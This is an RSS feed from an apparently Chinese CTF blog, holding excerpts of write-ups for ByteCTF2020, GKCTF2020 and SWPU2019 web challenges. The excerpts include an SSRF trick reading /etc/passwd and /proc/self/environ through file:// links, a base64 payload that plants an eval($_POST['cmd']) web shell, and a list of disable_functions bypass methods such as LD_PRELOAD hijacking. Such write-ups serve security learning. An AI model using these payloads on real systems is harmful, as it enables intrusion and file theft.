@@ -1,0 +1,70 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Redis on wh1sper</title>
+    <link>https://anthem-whisper.github.io/tags/redis/</link>
+    <description>Recent content in Redis on wh1sper</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Wed, 28 Oct 2020 00:00:00 +0000</lastBuildDate><atom:link href="https://anthem-whisper.github.io/tags/redis/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>ByteCTF2020复现</title>
+      <link>https://anthem-whisper.github.io/p/bytectf2020%E5%A4%8D%E7%8E%B0/</link>
+      <pubDate>Wed, 28 Oct 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://anthem-whisper.github.io/p/bytectf2020%E5%A4%8D%E7%8E%B0/</guid>
+      <description>这次ByteCTF2020的web题目非常顶，第一天比赛快结束的时候全场web才有了第一个解，后来解人数最多的XSS也就不过十个解，可惜一直在看爬虫的题，最后还是没做出。
+ easy_scrapy 考点：MD5爆破、SSRF
+功能是添加一个http://或者https://开头的URL，并且要求输入验证码，可以利用以下脚本来爆破：
+import hashlibfor i in range(99999999):if hashlib.md5(str(i).encode(&#39;UTF-8&#39;)).hexdigest()[:6] == &#39;2c97b3&#39;:print(i)break十几秒能出结果，之后可以BP重放数据包来快速的添加。
+添加成功之后可以在MyUrlList里面看到添加记录，点进去可以看到爬取到的东西。
+监听端口接收到请求：
+GET / HTTP/1.1Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: enUser-Agent: scrapy_redisAccept-Encoding: gzip, deflate发现是scrapy_redis，初步猜测是SSRF打redis。
+既然他是爬虫，那么遇到类似于这种标签的话，他很有可能就会去请求，（后来放了HINT，叫去读这个页面的源码）尝试爬以下这道题的公网IP，发现他会把/list的源码一并爬下来，那么我们可以起一个页面来指向file:///etc/passwd
+比赛的时候我用的是302重定向好像不行（哭了），其实这里他遇到一个标签就会去请求：
+我们可以发现他请求到了我们想要的URL：
+把标签的href改成file协议果然可以造成任意文件读：
+这样的话我们可以逐一的读取他爬虫的源码，但是在这之前我们要先知道爬虫工作的绝对路径，可以通过读/proc/self/environ，得到绝对路径PWD=/code，这个知识点在本站[SWPU2019]Web3也提到过。
+在官方文档中找到了这个爬虫框架的结构：
+tutorial/scrapy.cfgtutorial/__init__.pyitems.pypipelines.pysettings.pyspiders/__init__.py...我们尝试去读取这些文件；
+scrapy.cfg:
+# Automatically created by: scrapy startproject## For more information about the [deploy] section see:# https://scrapyd.readthedocs.io/en/latest/deploy.html[settings]default = bytectf.</description>
+    </item>
+    
+    <item>
+      <title>GKCTF2020复现</title>
+      <link>https://anthem-whisper.github.io/p/gkctf2020%E5%A4%8D%E7%8E%B0/</link>
+      <pubDate>Sat, 20 Jun 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://anthem-whisper.github.io/p/gkctf2020%E5%A4%8D%E7%8E%B0/</guid>
+      <description>GKCTF，题好平台棒，因为那段时间比赛太多就没打，现在填坑
+ CheckIN 考点：PHP73 bypass disable_functions
+打开题目是源码：
+&amp;lt;title&amp;gt;Check_In&amp;lt;/title&amp;gt;&amp;lt;?phphighlight_file(__FILE__);class ClassName{public $code = null;public $decode = null;function __construct(){$this-&amp;gt;code = @$this-&amp;gt;x()[&#39;Ginkgo&#39;];$this-&amp;gt;decode = @base64_decode( $this-&amp;gt;code );@Eval($this-&amp;gt;decode);}public function x(){return $_REQUEST;}}new ClassName();目标很明确，传入 ?Ginkgo=（PHP代码） 就可以RCE，我们执行以下 phpinfo() 发现正常回显，但是system却没有回显。
+我先构造一个shell蚁剑连接再说：?Ginkgo=ZXZhbCgkX1BPU1RbJ2NtZCddKTs= （?Ginkgo=eval($_POST[&amp;lsquo;cmd&amp;rsquo;]);）
+连接上之后，可以使用文件系统，但是虚拟终端却不能执行命令，猜测是disable_functions，在phpinfo里面果然翻到了
+关于bypass diable_functions，这里推荐一篇文章
+有四种绕过 disable_functions 的手法：
+ 第一种，攻击后端组件，寻找存在命令注入的、web 应用常用的后端组件，如，ImageMagick 的魔图漏洞、bash 的破壳漏洞； 第二种，寻找未禁用的漏网函数，常见的执行命令的函数有 system()、exec()、shell_exec()、passthru()，偏僻的 popen()、proc_open()、pcntl_exec()，逐一尝试，或许有漏网之鱼； 第三种，mod_cgi 模式，尝试修改 .htaccess，调整请求访问路由，绕过 php.ini 中的任何限制； 第四种，利用环境变量 LD_PRELOAD 劫持系统函数，让外部程序加载恶意 *.</description>
+    </item>
+    
+    <item>
+      <title>SWPU2019 复现</title>
+      <link>https://anthem-whisper.github.io/p/swpu2019-%E5%A4%8D%E7%8E%B0/</link>
+      <pubDate>Mon, 18 May 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://anthem-whisper.github.io/p/swpu2019-%E5%A4%8D%E7%8E%B0/</guid>
+      <description>Web2 考点：redis弱口令，python反序列化
+BUU上面的环境需要 Shadowsocks 代理才能访问，配置这个都搞了半天（tcl
+下载配置shadowsocks sudo apt-get install shadowsocks连接代理 sslocal -s node3.buuoj.cn -p 11111 -k 123456报错：AttributeError: /usr/lib/x86_64-linux-gnu/libcrypto.so.1.1: undefined symbol: EVP_CIPHER_CTX_cleanup
+报错参考：https://www.jianshu.com/p/3f874d5aac54
+在Python2.7中的openssl文件中,下面这个函数没有定义,具体就是这个:
+EVP_CIPHER_CTX_cleanup更深层的是是由于在openssl1.1.0版本中，废弃了 EVP_CIPHER_CTX_cleanup 函数,要用这个函数 EVP_CIPHER_CTX_reset() 代替;
+直接 vim /usr/local/lib/python2.7/dist-packages/shadowsocks/crypto/openssl.py 打开文件，全局搜索关键字替换即可；
+kali下编译安装proxychains4 编译安装 git clone https://github.com/rofl0r/proxychains-ng.git # downloadcd proxychains-ng./configuresudo make sudo make installcp ./src/proxychains.conf /etc/proxychains.conf # config file用proxychains做正向代理 vim /etc/proxychains.conf添加一行：socks5 127.0.0.1 1080（具体取决于你的ss配置的端口）
+不过我这里需要注释掉原来的那一行 socks4 127.0.0.1 9050
+命令行访问内网 proxychains4 ping web 只需在前面加 proxychains4 就行了</description>
+    </item>
+    
+  </channel>
+</rss>
